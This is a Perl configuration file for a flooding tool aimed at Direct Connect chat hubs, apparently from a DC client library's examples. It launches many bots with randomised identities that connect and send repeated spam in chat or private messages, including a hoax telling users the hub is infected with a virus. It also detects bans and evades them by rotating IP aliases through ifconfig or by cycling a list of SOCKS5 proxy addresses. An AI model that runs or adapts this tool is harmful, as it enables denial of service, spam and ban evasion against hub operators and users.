#!/usr/bin/perl
#$Id: flooddef.pl 754 2011-03-07 01:07:15Z pro $ $URL: svn://svn.setun.net/dcppp/trunk/examples/flooddef.pl $
#
#flood.pl default config
#
use strict;
our (%config);
my ( %proxyerr, %proxyok );
$config{'flood_tries'}      = 100;
$config{'connect_wait'}     = 30;
$config{'connect_aft_wait'} = 5;
$config{'send_tries'}       = 1000;
$config{'send_sleep'}       = 2;
$config{'after_sleep'}      = 2;
$config{'log_filter'}       = 1;
#$config{'bots'}        = 5; #parallel
$config{'dcbot_param'} = sub {
  return {
    #'Timeout'       => 15,
    'Nick' => ( $ARGV[1] or rand_str( rand_int( 1, 10 ) ) ),
    'sharesize'   => rand_int( 1,           1000000000000 ),
    'client'      => rand_str( rand_int( 1, 5 ) ),
    'description' => rand_str( rand_int( 1, 20 ) ),
    'email'   => rand_str( rand_int( 2, 10 ) ) . '@' . rand_str( rand_int( 2, 10 ) ) . '.com',
    'Version' => rand_int( 1,           1000 ),
    'V'       => rand_int( 1,           1000 ),
    'M'       => 'P',                   #mode - passive
                                                                                                 #'log'		=>	sub {},	# no logging
           #'log'		=>	sub {return if $_[0] =~ /dbg|dmp/},	# no logging
           #'min_chat_delay'	=> 0.401,
           #'min_cmd_delay'	=> 0.401,
  };
};
$config{'handler'}{'create_aft'} = sub {
  my ($dc) = @_;
  $dc->{'handler'}{'To'} = $dc->{'handler'}{'welcome'} = sub {
    for (@_) {
      #print("ban test[$_]\n");
      print("[$dc->{'number'}]BANNED! disconnect.[$_]\n"), $dc->disconnect(), delete $config{'proxy'}{ $dc->{'proxy'} },
        delete $proxyok{ $dc->{'proxy'} }, ++$proxyerr{ $dc->{'proxy'} }, last
        if
/лишен права говорить в чате|Sorry you are permanently banned|Вы были забанены|временно забанены|У вас открыто недостаточно слотов|You are being kicked/i;
    }
  };
  $dc->{'handler'}{'ForceMove'} = $dc->{'handler'}{'welcome'} = sub {
    print("[$dc->{'number'}]BANNED! disconnect. forcemove\n"), $dc->disconnect(), delete $config{'proxy'}{ $dc->{'proxy'} };
  };
  $dc->{'handler'}{'Hello'} = sub { print("[$dc->{'number'}] logged in.\n"); };
  $dc->{'handler'}{'chatline'} = sub { my $dc = shift; print( "[$dc->{'number'}] chatline ", @_, ".\n" ); };
};
$config{'handler'}{'send'} = sub {
  my ( $dc, $n ) = @_;
#
#simple chat line
#$dc->rcmd( 'chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!' );
#
#randomized line
#$dc->rcmd('chatline',rand_str_ex( 'Доброго времени суток! Пользуясь случаем, хотим попросить Вас больше никогда не рекламировать свой хаб где попало. Спасибо. '. $n ) );
#
#to every private
#$dc->rcmd('To', $_, 'HUB заражен вирусом срочно покиньте его!') for keys %{$dc->{'NickList'}};
#
};

=example with ip changing
my ($ip, $ipa, $ipb, $ipc, $ipd);

sub genip { return (10, 131, rand_int( 230, 255 ), rand_int( 1, 255 ) );}
sub ipglue {return join'.', (@_ or ($ipa, $ipb, $ipc, $ipd))}

$config{'handler'}{'param'} = sub {
  return ('sockopts'    => { 'LocalAddr' => ipglue() });
};

sub if_del {
  print "if del $ip\n";
  print `ifconfig lo1 $ip  -alias`;
}
$config{'handler'}{'create_bef'} = sub {
  ($ipa, $ipb, $ipc, $ipd) = genip();
  $ip = ipglue();
  print "if create $ip\n";
  print `ifconfig lo1 alias $ip/32`;
  print "ok\n";
};
$config{'handler'}{'destroy'} = sub {
  my ($dc) = @_;
  if_del();
};
=cut

=socks5 example
$config{'proxy_first'} = 1; # use first working proxy - dont show all
@{ $config{'proxy'} }{qw(
 24.15.202.25:7566 211.239.150.148:3370 70.135.33.176:19650 76.25.226.185:62059 
)} = ();
use IO::Socket::Socks;
$config{'handler'}{'create_aft0'} = sub {
  my ($self) = @_;
  local @_;
  @_ = keys %proxyok if $config{'proxy_first'};
  @_ = keys %{ $config{'proxy'} } unless @_;
#$self->log( 'info','selecting proxy from', @_);
  return
    unless my $proxy = ( shuffle(@_) )[0]
      or $self->{'status'} = 'todestroy', $self->log( 'err', 'no good socks', ), return;
  my ( $host, $port ) = split /:/, $proxy;
  $self->log(
    'info', "[$self->{'number'}]",
    'creating socks',
    ( $host, $port ),
    'err=', $proxyerr{$proxy}, 'oks=', $proxyok{$proxy}
  );
  $self->{'socket'} = new IO::Socket::Socks(
    ProxyAddr   => $host,
    ProxyPort   => $port,
    ConnectAddr => name_to_ip( $self->{'host'} ),
    ConnectPort => $self->{'port'},
    'Timeout'  => $self->{'Timeout'},
  );
  if ( !defined( $self->{'socket'} ) ) {
    $self->log( 'err', "[$self->{'number'}]", 'socks', $SOCKS_ERROR );
    $self->{'status'} = 'todestroy';
    $self->log( 'warn', 'removing socks', $proxy ), delete $config{'proxy'}{$proxy} if ++$proxyerr{$proxy} > 2;
    delete $proxyok{$proxy} if --$proxyok{$proxy} < 0;
  } else {
    delete $proxyerr{$proxy};
    ++$proxyok{$proxy};
    $self->{'proxy'} = $proxy;
  }
};
END { print "good proxies: ", join ' ', keys %proxyok if keys %proxyok }
=cut
